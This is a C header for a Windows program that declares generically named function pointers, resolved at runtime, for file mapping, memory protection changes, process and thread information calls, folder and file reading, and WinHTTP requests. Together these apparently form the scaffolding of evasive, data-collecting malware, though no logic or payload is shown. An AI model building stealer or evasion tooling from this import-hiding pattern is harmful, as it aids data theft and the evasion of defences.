#pragma once
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <strsafe.h>
#include <winternl.h>
#include <shlobj_core.h>
#include <winhttp.h>

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)    
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

#define allocMem(Size) heap_alloc(get_process_heap(), HEAP_ZERO_MEMORY, (Size))
#define freeMem(Source) heap_free(get_process_heap(), 0, (Source))

typedef struct _FILE_DIRECTORY_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;

typedef UINT(WINAPI* FUNC1)(LPWSTR lpBuffer, UINT uSize);
typedef HANDLE(WINAPI* FUNC2)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI* FUNC3)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
typedef LPVOID(WINAPI* FUNC4)(HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI* FUNC5)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI* FUNC6)(HANDLE hObject);
typedef VOID(NTAPI* FUNC7)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI* FUNC8)(IN PWCHAR PathToFile OPTIONAL, IN ULONG Flags OPTIONAL, IN PUNICODE_STRING  ModuleFileName, OUT PHANDLE ModuleHandle);
typedef NTSTATUS(NTAPI* FUNC9)(HMODULE  ModuleHandle, PANSI_STRING FUNCtionName OPTIONAL, WORD Oridinal, PVOID* FUNCtionAddress);
typedef NTSTATUS(NTAPI* FUNC10)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* FUNC11)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
typedef HANDLE(WINAPI* FUNC12)();
typedef LPVOID(WINAPI* FUNC13)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef BOOL(WINAPI* FUNC14)(HANDLE hHeap, DWORD dwFlags, _Frees_ptr_opt_ LPVOID lpMem);
typedef NTSTATUS(NTAPI* FUNC15)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef HRESULT(WINAPI* FUNC16)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
typedef NTSTATUS(NTAPI* FUNC17)(HANDLE Handle);
typedef NTSTATUS(NTAPI* FUNC18)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
typedef NTSTATUS(NTAPI* FUNC19)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE  ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length,PLARGE_INTEGER ByteOffset, PULONG Key);
typedef DWORD(WINAPI* FUNC20)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef HINTERNET(WINAPI* FUNC21)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef BOOL(WINAPI* FUNC22)(HINTERNET hInternet);
typedef HINTERNET(WINAPI* FUNC23)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* FUNC24)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL(WINAPI* FUNC25)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(WINAPI* FUNC26)(HINTERNET hRequest, LPVOID lpReserved);

FUNC1 get_system_directory;
FUNC2 create_file;
FUNC3 create_file_mapping;
FUNC4 map_view_of_file;
FUNC5 virtual_protect;
FUNC6 close_handle;
FUNC7 rtl_init_unicode_string;
FUNC8 ldr_load_dll;
FUNC9 ldr_get_procedure_address;
FUNC10 nt_query_information_process;
FUNC11 nt_set_information_thread;
FUNC12 get_process_heap;
FUNC13 heap_alloc;
FUNC14 heap_free;
FUNC15 nt_create_file;
FUNC16 sh_get_folder_path;
FUNC17 nt_close;
FUNC18 nt_query_directory_file;
FUNC19 nt_read_file;
FUNC20 get_file_size;
FUNC21 win_http_open;
FUNC22 win_http_close_handle;
FUNC23 win_http_connect;
FUNC24 win_http_open_request;
FUNC25 win_http_send_request;
FUNC26 win_http_receive_response;

void loadFunctions();